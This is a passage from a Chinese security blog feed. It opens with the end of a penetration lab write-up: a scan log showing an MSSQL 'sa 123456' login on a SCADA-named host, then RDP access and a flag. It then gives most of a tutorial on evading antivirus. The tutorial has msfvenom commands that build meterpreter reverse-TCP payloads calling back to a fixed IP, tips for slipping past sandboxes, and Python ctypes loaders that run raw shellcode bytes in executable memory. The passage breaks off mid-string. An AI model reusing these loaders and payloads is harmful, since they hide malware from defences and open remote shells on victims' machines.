1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">172.22.26.11:445 open</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">172.22.26.11:139 open</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">172.22.26.11:80 open</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">172.22.26.11:135 open</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">172.22.26.11:1433 open</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] alive ports len is: 5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">start vulscan</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] NetBios 172.22.26.11 WORKGROUP\WIN-SCADA</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] mssql 172.22.26.11:1433:sa 123456</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] NetInfo</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*]172.22.26.11</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[-&gt;]WIN-SCADA</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[-&gt;]172.22.26.11</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] WebTitle http://172.22.26.11 code:200 len:703 title:IIS Windows Server</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">å·²å®Œæˆ 5/5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] æ‰«æç»“æŸ,è€—æ—¶: 4.784177011s</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>çœ‹å…³é”®ç‚¹ rdpè¿æ¥ä¸€ä¸‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734614506855-1796f68a-d584-4e60-946c-fab800f60fec.png"></p><p>ç‚¹å‡»é”…ç‚‰å¼€æ‹¿åˆ°ä¸€ä¸ªflag</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734614620054-999d6ab2-bd88-4889-8a91-9a43f288f7c7.png"></p><p>å¯ä»¥çœ‹åˆ°æœ€åä¸€ä¸ªæ•°æ®åº“ä¸ºç©ºå…¶å®æ˜¯è¢«å‹’ç´¢åŠ å¯†äº† <img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734614654940-f2be1b6a-c572-47dc-9e6f-4756eb98cd0c.png"></p><p>æ¡Œé¢æœ‰è¢«åŠ å¯†çš„æ–‡ä»¶ï¼Œå¯†é’¥ä¿¡æ¯åœ¨æ–‡ä»¶æè¿°é‡Œ,è¿™éƒ¨åˆ†å‚è€ƒ</p><p><a href="https://fushuling.com/index.php/2024/03/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-thermalpower/">https://fushuling.com/index.php/2024/03/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-thermalpower/</a></p>]]></content>
      
      
      <categories>
          
          <category> æ”»é˜²æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> æ˜¥ç§‹äº‘é•œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é™æ€å…æ€å…¥é—¨</title>
      <link href="/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/"/>
      <url>/2024/12/30/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="shellcode-loader"><a href="#shellcode-loader" class="headerlink" title="shellcode loader"></a>shellcode loader</h2><p>shellcodeè¦æƒ³æ‰§è¡Œéœ€è¦ç»å†å¦‚ä¸‹å‡ ä¸ªè¿‡ç¨‹ï¼š</p><ol><li>ç”³è¯·ä¸€å—å†…å­˜ï¼›</li><li>æŠŠshellcodeåŠ è½½åˆ°è¿™å—å†…å­˜ï¼›</li><li>æ‰§è¡Œè¿™å—å†…å­˜ã€‚</li></ol><p>è¿™è¿‡ç¨‹ä¸­éœ€è¦æ³¨æ„å¦‚ä¸‹å‡ ç‚¹ï¼š</p><ol><li>åŠ è½½dllï¼Œé‡‡ç”¨åŠ¨æ€è°ƒç”¨çš„æ–¹å¼ï¼Œå¯ä»¥é¿å…IATçš„hookï¼›</li><li>ä¸è¦ç›´æ¥ç”³è¯·rwx(è¯»å†™æ‰§è¡Œ)çš„å†…å­˜ï¼Œå¯å…ˆç”³è¯·rwå†…å­˜ï¼Œåé¢å†æ”¹ä¸ºå¯æ‰§è¡Œï¼Œæ€è½¯å¯¹rwxçš„å†…å­˜å¾ˆæ•æ„Ÿï¼›</li><li>åŠ è½½åˆ°å†…å­˜çš„æ–¹æ³•éå¸¸å¤šï¼Œé™¤äº†å¸¸è§çš„copyå’Œmoveè¿˜æœ‰uuidè¿™ç§åŠ è½½æ—¢èƒ½è¾¾åˆ°åŠ å¯†shellcodeçš„æ•ˆæœï¼Œè¿˜èƒ½ç›´æ¥åŠ è½½åˆ°å†…å­˜ï¼›</li><li>æ‰§è¡Œå†…å­˜ï¼Œè¿˜å¯ä»¥ç”¨å›è°ƒæ¥è§¦å‘å¦‚EnumChildWindowsï¼›</li><li>APIè°ƒç”¨ä¸­é—´å¯ä»¥æ’å…¥ä¸€äº›æ²¡ç”¨çš„ä»£ç ï¼Œæ‰“ä¹±APIè°ƒç”¨ï¼›</li><li>é€‚å½“åŠ ä¸€äº›sleepï¼Œå¯ä»¥è¿‡ä¸€äº›æ²™ç®±ã€‚</li></ol><h2 id="shellcodeå˜å¼‚åŠ å¯†æ··æ·†å›è°ƒæ‰§è¡Œä»£ç "><a href="#shellcodeå˜å¼‚åŠ å¯†æ··æ·†å›è°ƒæ‰§è¡Œä»£ç " class="headerlink" title="shellcodeå˜å¼‚åŠ å¯†æ··æ·†å›è°ƒæ‰§è¡Œä»£ç "></a>shellcodeå˜å¼‚åŠ å¯†æ··æ·†å›è°ƒæ‰§è¡Œä»£ç </h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">C/C++-ShellCodeåˆ†æ-OD&amp;IDA&amp;æœ”æº</span></span><br><span class="line">1ã€EXEæœ”æº-IPåŠç«¯å£-æ€æ¯’åˆ†æ</span><br><span class="line">2ã€ç¼–è¯‘ä¿®æ”¹-IPåŠç«¯å£-å¨èƒæ„ŸçŸ¥</span><br><span class="line">reverse_tcp.asm</span><br><span class="line">https://www.cnblogs.com/Akkuman/p/12859091.html</span><br><span class="line">https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/windows/reverse_tcp.rb</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">C/C++-ShellCodeå˜å¼‚-ç¼–ç æ··æ·†åŠ å¯†ç®—æ³•</span></span><br><span class="line">Xor Aes Hex Rc4 Rsaç­‰</span><br><span class="line">https://github.com/Arno0x/ShellcodeWrapper</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; lhost=47.94.236.117 lport=3333 -f raw &gt; shellcode.raw</span><br><span class="line">1ã€python2 shellcode_encoder.py -cpp -cs -py shellcode.raw xiaodi xor</span><br><span class="line">CS&amp;MSF</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; lhost=47.94.236.117 lport=3333 -f raw &gt; shellcode.raw</span><br><span class="line">python xor.py -s shellcode.bin  -d payload.c -n 10 -r out.bin</span><br><span class="line">2ã€python2 shellcode_encoder.py -cpp -cs -py shellcode.raw xiaodi aes</span><br><span class="line">3ã€Hex</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=47.94.236.117 lport=6688 -f c</span><br><span class="line">https://gchq.github.io/CyberChef/</span><br><span class="line">https://github.com/ByPassAVTeam/ShellcodeLoader</span><br><span class="line">LoaderMaker.exe download.dat(hexæ•°æ®) xiaodi.exe(ç”Ÿæˆæ–‡ä»¶å)</span><br><span class="line">4ã€Rc4</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=47.94.236.117 lport=6688 -f c </span><br><span class="line">https://blog.csdn.net/weixin_45590789/article/details/105536623</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">C/C++-å›è°ƒæ‰§è¡Œä»£ç -æ±‡ç¼–&amp;å¥æŸ„&amp;API&amp;UIç­‰</span></span><br><span class="line">Callback_Shellcode_Injection-main</span><br><span class="line">https://github.com/ChaitanyaHaritash/Callback_Shellcode_Injection</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="åŠ è½½å™¨"><a href="#åŠ è½½å™¨" class="headerlink" title="åŠ è½½å™¨"></a>åŠ è½½å™¨</h2><p><a href="https://shu1l.github.io/2021/08/17/mian-sha-xue-xi-shellcode-jia-zai-mian-sha/">https://shu1l.github.io/2021/08/17/mian-sha-xue-xi-shellcode-jia-zai-mian-sha/</a></p><p><a href="https://xz.aliyun.com/t/9385">https://xz.aliyun.com/t/9385</a></p><p><a href="https://xz.aliyun.com/t/12253">https://xz.aliyun.com/t/12253</a></p><h3 id="pythonåŠ è½½å™¨"><a href="#pythonåŠ è½½å™¨" class="headerlink" title="pythonåŠ è½½å™¨"></a>pythonåŠ è½½å™¨</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(<span class="string">&quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#é€šè¿‡è°ƒç”¨VirtualAllocå‡½æ•°ï¼Œç”³è¯·ä¸€å—åŠ¨æ€å†…å­˜åŒºåŸŸ</span></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>),<span class="comment">#è¦åˆ†é…çš„å†…å­˜åŒºåŸŸçš„åœ°å€</span></span><br><span class="line">                                          ctypes.c_int(<span class="built_in">len</span>(shellcode)), <span class="comment">#åˆ†é…çš„å¤§å°</span></span><br><span class="line">                                          ctypes.c_int(<span class="number">0x3000</span>), <span class="comment">#åˆ†é…çš„ç±»å‹</span></span><br><span class="line">                                          ctypes.c_int(<span class="number">0x40</span>)) <span class="comment">#è¯¥å†…å­˜çš„åˆå§‹ä¿æŠ¤å±æ€§</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="comment">#è°ƒç”¨RtlMoveMemoryå‡½æ•°ï¼Œå‡½æ•°ä»æˆ‘ä»¬æŒ‡å®šçš„å†…å­˜å¤åˆ¶å†…å®¹åˆ°å¦ä¸€å†…å­˜</span></span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),</span><br><span class="line">                                    buf,</span><br><span class="line">                                    ctypes.c_int(<span class="built_in">len</span>(shellcode)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#è°ƒç”¨CreateThreadå°†åœ¨ä¸»çº¿ç¨‹çš„åŸºç¡€ä¸Šåˆ›å»ºä¸€ä¸ªæ–°çº¿ç¨‹</span></span><br><span class="line">ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                         ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                         ctypes.c_int(ptr),</span><br><span class="line">                                         ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                         ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                         ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#è°ƒç”¨WaitForSingleObjectå‡½æ•°ç­‰å¾…åˆ›å»ºçš„çº¿ç¨‹è¿è¡Œç»“æŸã€‚</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure><p>ä»£ç ä¸æ˜¯å¾ˆé•¿ï¼Œå¯ä»¥çœ‹åˆ°ä¸»è¦è°ƒç”¨çš„å°±æ˜¯ctypesè¿™ä¸ªåº“ã€‚</p><p>ctypes æ˜¯ Python çš„å¤–éƒ¨å‡½æ•°åº“ã€‚å®ƒæä¾›äº†ä¸ C å…¼å®¹çš„æ•°æ®ç±»å‹ï¼Œå¹¶å…è®¸è°ƒç”¨ DLL æˆ–å…±äº«åº“ä¸­çš„å‡½æ•°ã€‚å¯ä½¿ç”¨è¯¥æ¨¡å—ä»¥çº¯ Python å½¢å¼å¯¹è¿™äº›åº“è¿›è¡Œå°è£…ã€‚</p><p>ä¸»è¦æµç¨‹</p><ul><li>è°ƒç”¨VirtualAllocå‡½æ•°ï¼Œæ¥ç”³è¯·ä¸€å—å¯è¯»å¯å†™å¯æ‰§è¡Œçš„åŠ¨æ€å†…å­˜åŒºåŸŸã€‚</li><li>è°ƒç”¨RtlMoveMemoryå‡½æ•°ï¼Œæ­¤å‡½æ•°ä»æŒ‡å®šå†…å­˜ä¸­å¤åˆ¶å†…å®¹è‡³å¦ä¸€å†…å­˜é‡Œã€‚</li><li>è°ƒç”¨CreateThreadå‡½æ•°ï¼Œåœ¨ä¸»çº¿ç¨‹çš„åŸºç¡€ä¸Šåˆ›å»ºä¸€ä¸ªæ–°çº¿ç¨‹ã€‚</li><li>è°ƒç”¨WaitForSingleObjectå‡½æ•°ï¼Œç­‰å¾…åˆ›å»ºçš„çº¿ç¨‹è¿è¡Œç»“æŸã€‚</li></ul><p>å½“ç„¶ç›®å‰æ¥è¯´è¿™ç§æ¯”è¾ƒåŸå§‹çš„æ–¹å¼æ€è½¯å·²ç»æ€å¾ˆä¸¥äº†ï¼Œæ‰€ä»¥ä¹‹åæ›´å¤šè¦æœ‰æ··æ·†åŠ å¯†çš„æ“ä½œã€‚</p><p>å¸¸è§çš„æœ‰HexåŠ å¯†ã€AESåŠ å¯†ã€XORåŠ å¯†ã€base64ç­‰ç­‰ï¼Œæˆ–è€…å¯ä»¥è‡ªå·±å†™åŠ å¯†å’Œè§£å¯†ï¼Œå…æ€æ•ˆæœä¼šæ›´å¥½</p><h4 id="HEXåŠ å¯†"><a href="#HEXåŠ å¯†" class="headerlink" title="HEXåŠ å¯†"></a>HEXåŠ å¯†</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="comment"># length: 894 bytes</span></span><br><span class="line">buf = <span class="string">b&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x60\x11\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x4a\x4f\x78\x4c\x00\x03\x8b\x02\x94\xad\x26\x3e\xe1\xe1\xa4\x48\xe2\xc0\xf1\x5b\x10\x17\x75\x09\x3f\x3d\xfa\xd0\xf9\xc2\x70\x02\xb3\xeb\x7c\x2d\x70\xfb\x34\x9e\x0e\x3e\x47\xcd\x1d\xc3\x4c\x0c\x33\x8b\xce\x7b\x5b\x2a\xdb\x40\xbc\x9b\x5e\x7b\x9a\x53\x88\x7e\x93\xf0\xbe\x6c\xde\x11\x29\x2d\xae\x8e\xa2\x39\xe5\x4f\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x42\x4f\x49\x45\x39\x3b\x45\x4e\x55\x53\x29\x0d\x0a\x00\xc6\x24\x6a\xc0\x95\x01\xb9\x1d\x74\x0d\xbf\x57\x5c\x3d\x4a\x7f\x60\xa3\x07\xe6\x08\xb1\x97\x28\xfb\xad\x21\x89\xc1\xd0\x3a\x97\xa6\x22\x1f\xfc\xf2\x84\xa4\x04\x48\x4d\xc3\x69\x8a\x56\xbf\xd8\x30\x44\x11\x09\x9d\xfe\xdb\x1b\x35\xfe\xd7\x4d\x11\x49\x87\x3b\x4d\xaa\x39\x95\x1c\x82\xd3\xf7\x21\xf3\xb6\x46\x0d\x3b\x7d\x66\x84\x3a\xba\xc0\xc7\x42\x21\x27\x69\x3b\xca\x10\x56\xb6\xfa\xe2\xec\x57\xd0\x7f\xbc\xa5\x7d\x30\xd8\x1c\x7e\x53\xc1\xf7\x5b\xd9\xce\x24\x21\x4a\x55\x03\x88\x0e\x72\x80\x51\x5a\x92\x37\x69\x22\xf4\x72\x5e\x9a\x97\xdf\x9c\x28\xa4\x6e\x52\x50\x94\x89\xa3\x74\x69\x4e\x7f\xa5\xd0\x6c\x59\x72\x13\xb5\xf4\xde\x21\x53\x1b\x9f\x52\x83\x86\x76\x93\x9c\x21\xec\xd5\x9c\x31\x17\x60\x03\x27\x71\xc2\x46\xea\xa4\x16\xda\xe3\x6e\x11\xef\x21\x28\xb7\xe8\x5f\x63\x1b\x34\xd9\xf6\xe4\xf6\x2a\x3b\xf6\x00\xda\x13\x93\x88\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x34\x33\x2e\x31\x33\x38\x2e\x32\x37\x2e\x31\x32\x00\x49\x96\x02\xd2&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode = buf</span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(shellcode)</span><br><span class="line"><span class="comment"># è®¾ç½®VirtualAllocè¿”å›ç±»å‹ä¸ºctypes.c_uint64</span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"><span class="comment"># ç”³è¯·å†…å­˜</span></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"><span class="comment"># æ”¾å…¥shellcode</span></span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line">    ctypes.c_uint64(ptr),</span><br><span class="line">    buf,</span><br><span class="line">    ctypes.c_int(<span class="built_in">len</span>(shellcode))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ä»shellcodeæ”¾ç½®ä½ç½®é¦–åœ°å€å¼€å§‹æ‰§è¡Œ</span></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.c_uint64(ptr),</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.pointer(ctypes.c_int(<span class="number">0</span>))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># ç­‰å¾…ä¸Šé¢åˆ›å»ºçš„çº¿ç¨‹è¿è¡Œå®Œ</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-<span class="number">1</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Base64æ··æ·†"><a href="#Base64æ··æ·†" class="headerlink" title="Base64æ··æ·†"></a>Base64æ··æ·†</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># length: 894 bytes</span></span><br><span class="line"><span class="comment"># buf = b&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x60\x11\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x4a\x4f\x78\x4c\x00\x03\x8b\x02\x94\xad\x26\x3e\xe1\xe1\xa4\x48\xe2\xc0\xf1\x5b\x10\x17\x75\x09\x3f\x3d\xfa\xd0\xf9\xc2\x70\x02\xb3\xeb\x7c\x2d\x70\xfb\x34\x9e\x0e\x3e\x47\xcd\x1d\xc3\x4c\x0c\x33\x8b\xce\x7b\x5b\x2a\xdb\x40\xbc\x9b\x5e\x7b\x9a\x53\x88\x7e\x93\xf0\xbe\x6c\xde\x11\x29\x2d\xae\x8e\xa2\x39\xe5\x4f\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\